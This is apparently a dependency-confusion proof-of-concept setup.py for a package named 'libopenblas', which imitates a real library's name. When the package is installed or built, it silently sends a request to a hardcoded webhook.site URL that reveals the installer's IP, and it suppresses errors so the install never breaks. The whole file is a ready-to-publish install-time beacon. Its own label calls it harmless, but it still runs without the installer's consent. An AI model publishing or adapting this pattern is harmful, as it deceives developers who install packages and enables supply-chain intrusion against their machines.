from setuptools import setup
import urllib.request

# Your webhook.site URL (will show installer’s source IP)
BEACON_URL = "https://webhook.site/7dafb1da-4fb8-4d95-99b9-679d6e02d27f"

def beacon_once():
    try:
        # Perform a simple GET request (no data sent)
        req = urllib.request.Request(BEACON_URL, method="GET")
        with urllib.request.urlopen(req, timeout=3):
            pass
    except Exception:
        # Ignore errors so install never breaks
        pass

# Trigger beacon at install/build time
beacon_once()

# Standard setup call
setup(
    name="libopenblas",
    version="0.4.21",
    packages=["libopenblas"],
    description="POC package (harmless beacon-only)",
)
